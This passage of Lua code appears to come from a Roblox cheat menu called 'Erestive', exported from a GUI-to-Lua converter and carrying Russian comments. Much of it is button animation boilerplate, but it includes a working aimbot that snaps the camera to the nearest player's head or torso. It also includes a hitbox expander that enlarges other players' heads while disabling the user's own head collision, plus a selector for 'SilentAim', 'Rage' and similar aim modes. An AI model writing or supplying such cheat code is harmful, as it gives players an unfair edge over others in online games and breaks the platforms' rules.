	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2bf);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2c3()
local script = G2L["2c3"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.TopInformation["1Frame"].AvaTextLabel.Visible == false then
			script.Parent.Parent.Parent.Parent.Parent.TopInformation["1Frame"].AvaTextLabel.Visible = true
			script.Parent.Parent.Parent.Parent.Parent.TopInformation["1Frame"]["1Image"].Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.TopInformation["1Frame"].AvaTextLabel.Visible = false
			script.Parent.Parent.Parent.Parent.Parent.TopInformation["1Frame"]["1Image"].Visible = true
		end
	end)
end;
task.spawn(C_2c3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2c4()
local script = G2L["2c4"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2c4);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2c8()
local script = G2L["2c8"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.NeverXText.blur.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.NeverXText.blur.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.NeverXText.blur.Visible = true
		end
	end)
end;
task.spawn(C_2c8);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2c9()
local script = G2L["2c9"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2c9);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.LocalScript
local function C_2cd()
local script = G2L["2cd"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.aim2.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.aim2.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.aim2.Visible = true
		end
	end)
end;
task.spawn(C_2cd);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.Animations
local function C_2ce()
local script = G2L["2ce"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2ce);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.LocalScript
local function C_2d2()
local script = G2L["2d2"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.aim3.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.aim3.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.aim3.Visible = true
		end
	end)
end;
task.spawn(C_2d2);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.Animations
local function C_2d3()
local script = G2L["2d3"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2d3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Animations
local function C_2df()
local script = G2L["2df"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_2df);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Button.Animations
local function C_2e3()
local script = G2L["2e3"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_2e3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Animations
local function C_2f3()
local script = G2L["2f3"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_2f3);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Button.LocalScript
local function C_2f8()
local script = G2L["2f8"];
	-- Локальный скрипт для обработки события нажатия кнопки
	local button = script.Parent.Parent.Button -- Убедись, что кнопка названа именно так!
	
	button.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.OnOrOff.Text == "On" then
			button.BackgroundColor3 = Color3.new(0.215686, 0, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "Off"
		else
			button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			script.Parent.Parent.Parent.OnOrOff.Text = "On"
		end
	end)
	task.spawn(function()
		while task.wait() do
			if _G.Settings.Aimbot == true then
				script.Parent.Parent.Parent.OnOrOff.Text = "On"
				button.BackgroundColor3 = Color3.new(0.027451, 0.215686, 0)
			end
		end
	end)
	
end;
task.spawn(C_2f8);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.LocalScript
local function C_300()
local script = G2L["300"];
	script.Parent.MouseEnter:Connect(function()
		script.Parent.TextLabel.Visible = true
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.TextLabel.Visible = false
	end)
end;
task.spawn(C_300);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton.LocalScript
local function C_308()
local script = G2L["308"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Text == "Head" then
			script.Parent.Text = "HumanoidRootPart"
			script.Parent.TextLabel.Text = "Torso"
		else
			script.Parent.Text = "Head"
			script.Parent.TextLabel.Text = "Head"
		end
	end)
	
end;
task.spawn(C_308);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.LocalScript
local function C_313()
local script = G2L["313"];
	script.Parent.MouseEnter:Connect(function()
		script.Parent.TextLabel.Visible = true
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.TextLabel.Visible = false
	end)
end;
task.spawn(C_313);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.FOVSet.LocalScript
local function C_31a()
local script = G2L["31a"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем каждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_31a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Animations
local function C_31c()
local script = G2L["31c"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_31c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Button.Animations
local function C_320()
local script = G2L["320"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_320);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.TextButton.legit
local function C_326()
local script = G2L["326"];
	local btn = script.Parent
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	-- Функция для изменения размера
	local function applyHeadSize(character, multiplier)
		local head = character:WaitForChild("Head", 2)
		if head and head:IsA("BasePart") then
			-- 1. Меняем размер (всем)
			head.Size = Vector3.new(1.2, 1.2, 1.2) * multiplier
	
			-- 2. ОТКЛЮЧАЕМ КОЛЛИЗИЮ ТОЛЬКО ТЕБЕ
			local isMyPlayer = (Players:GetPlayerFromCharacter(character) == player)
			if isMyPlayer then
				head.CanCollide = false
			else
				head.CanCollide = true -- Враги остаются твердыми
			end
	
			local mesh = head:FindFirstChildOfClass("SpecialMesh")
			if mesh then
				mesh.Scale = Vector3.new(1, 1, 1) * multiplier
			end
		end
	end
	
	-- Постоянно следим за коллизией ТВОЕЙ головы (Roblox любит её включать обратно)
	RunService.Stepped:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			player.Character.Head.CanCollide = false
		end
	end)
	
	-- Обновление всех игроков
	local function updateAllHeads()
		local m = tonumber(btn.Text) or 1
		for _, p in ipairs(Players:GetPlayers()) do
			if p.Character then
				applyHeadSize(p.Character, m)
			end
		end
	end
	
	-- Кнопка
	btn.MouseButton1Click:Connect(function()
		local sizes = {1, 1.3, 1.5, 1.8, 2}
		local current = tonumber(btn.Text) or 1
		local nextSize = sizes[1]
	
		for i, v in ipairs(sizes) do
			if v == current then
				nextSize = sizes[i+1] or sizes[1]
				break
			end
		end
	
		btn.Text = tostring(nextSize)
		updateAllHeads()
	end)
	
	-- Спавн
	local function onPlayerAdded(p)
		p.CharacterAdded:Connect(function(char)
			task.wait(0.5) 
			applyHeadSize(char, tonumber(btn.Text) or 1)
		end)
	end
	
	Players.PlayerAdded:Connect(onPlayerAdded)
	for _, p in ipairs(Players:GetPlayers()) do onPlayerAdded(p) end
	
end;
task.spawn(C_326);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.FOVSet.LocalScript
local function C_336()
local script = G2L["336"];
	local TextBox = script.Parent
	
	-- Обработчик события FocusLost
	TextBox.FocusLost:Connect(function()
		local inputText = TextBox.Text
	
		-- Проверяем каждую букву и оставляем только цифры
		local filteredText = ""
		for i = 1, #inputText do
			local char = string.sub(inputText, i, i)
	
			if string.match(char, "%d") then -- Оставляем только цифры
				filteredText = filteredText .. char
			end
		end
	
		-- Устанавливаем очищенный текст обратно в TextBox
		TextBox.Text = filteredText
	end)
end;
task.spawn(C_336);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Animations
local function C_338()
local script = G2L["338"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_338);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Animations
local function C_33c()
local script = G2L["33c"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_33c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.SetFOV.Button.Loca3
local function C_33e()
local script = G2L["33e"];
	local userInputService = game:GetService("UserInputService")
	
	local Camera = workspace.CurrentCamera
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- Переменная для управления режимом слежения
	local TrackingEnabled = false
	
	-- Максимальная дистанция слежения (в метрах)
	local DistationMax = 200
	
	-- Скорость слежения камеры (от 0 до 1, где 1 — мгновенное перемещение, около 0.5 — быстрое, но не резкое)
	local SpeedCam = 0.3  -- Здесь можешь подбирать значение от 0 до 1
	
	-- Ищет ближайшего игрока
	local function findNearestPlayer()
		local nearestPlayer = nil
		local minDistance = math.huge
	
		-- Выбор части персонажа, за которой следить (Head или HumanoidRootPart)
		local aimPartText = script.Parent.Parent.Parent.Parent.Parent.Parent.aimpart.FOV.FOVConfig.TextButton.Text
		local aimPart = aimPartText == "Head" and "Head" or "HumanoidRootPart"
	
		for _, player in pairs(Players.GetPlayers(Players)) do
			if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(aimPart) then
				local targetPart = player.Character[aimPart]
				local dist = (targetPart.Position - Camera.CoordinateFrame.Position).magnitude
				if dist < minDistance and dist <= DistationMax then
					minDistance = dist
					nearestPlayer = player
				end
			end
		end
	
		return nearestPlayer
	end
	
	-- Камера быстро и плавно ориентируется на ближайшую цель
	local function trackNearestPlayer()
		while true do
			if TrackingEnabled then
				local nearestPlayer = findNearestPlayer()
				if nearestPlayer then
					-- Выбор части персонажа, за которой следить (Head или HumanoidRootPart)
					local aimPartText = script.Parent.Parent.Parent.Parent.Parent.Parent.aimpart.FOV.FOVConfig.TextButton.Text
					local aimPart = aimPartText == "Head" and "Head" or "HumanoidRootPart"
	
					local targetPart = nearestPlayer.Character[aimPart]
					Camera.CoordinateFrame = Camera.CoordinateFrame:Lerp(CFrame.new(Camera.CoordinateFrame.Position, targetPart.Position), SpeedCam)
				end
			end
			wait(0.01)
		end
	end
	
	-- Переключение слежения
	local function toggleTracking()
		TrackingEnabled = not TrackingEnabled
		if TrackingEnabled then
			print("Слежение ВКЛЮЧЕНО")
		else
			print("Слежение ОТКЛЮЧЕНО")
		end
	end
	
	-- Управление переключателями
	local function setupToggleSwitch()
		local switchText = script.Parent.Parent.Parent.Parent.Parent.Parent.ONOFF.OnOrOff
		switchText.Changed:Connect(function(prop)
			if prop == "Text" then
				if switchText.Text == "On" then
					toggleTracking()
				elseif switchText.Text == "Off" then
					toggleTracking()
				end
			end
		end)
	end
	
	setupToggleSwitch()
	
	-- Запускаем слежение
	trackNearestPlayer()
end;
task.spawn(C_33e);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed.FOV.FOVConfig.TextButton.LocalScript
local function C_34a()
local script = G2L["34a"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Text == "RageAim" then
			script.Parent.Text = "SilentAim"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
		elseif script.Parent.Text == "SilentAim" then
			script.Parent.Text = "SmoothAim"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
			elseif script.Parent.Text == "SmoothAim" then
			script.Parent.Text = "Legit"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
			elseif script.Parent.Text == "Legit" then
			script.Parent.Text = "UltraRage"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
		elseif script.Parent.Text == "UltraRage" then
			script.Parent.Text = "Rage"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
		elseif script.Parent.Text == "Rage" then
			script.Parent.Text = "TeamRage"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = true
		elseif script.Parent.Text == "TeamRage" then
			script.Parent.Text = "RageAim"
			script.Parent.Parent.SetFOV.Button.Loca6.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca2.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca5.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca4.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca1.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca3.Enabled = false
			script.Parent.Parent.SetFOV.Button.Loca7.Enabled = true
			script.Parent.Parent.SetFOV.Button.Loca8.Enabled = false
				
		end
	end)
	
end;
task.spawn(C_34a);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Headsizer.Slider.Animations
local function C_355()
local script = G2L["355"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_355);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.DoubleTap.Slider.Animations
local function C_365()
local script = G2L["365"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
